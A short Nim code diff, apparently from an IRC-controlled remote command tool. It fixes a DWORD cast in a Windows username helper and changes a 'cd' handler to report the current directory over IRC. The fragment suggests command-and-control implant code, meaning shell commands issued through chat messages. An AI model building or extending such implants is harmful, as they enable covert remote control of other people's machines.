@@ -23,7 +23,7 @@ proc helper_getUsername*():string =
     var
         unames:string = ""
         unamea:array[256,byte]
-        unamea_size:DWORD = len(unamea)
+        unamea_size:DWORD = len(unamea).DWORD
 
     discard GetUserNameA(cast[LPSTR](addr unamea[0]), addr unamea_size)
     for c in unamea:
@@ -421,7 +421,7 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
     of "cd":
         if len(tokens) == 2:
             #response = await rexec_runCommand("echo %CD%")
-            discard helper_responseHandler(event, client, rexec_runCommand("echo %CD%"))
+            discard client.privmsg(event.origin, "cwd: " & getCurrentDir())
             #caught = true
         else:
             var path = await helper_recombine(tokens,2)
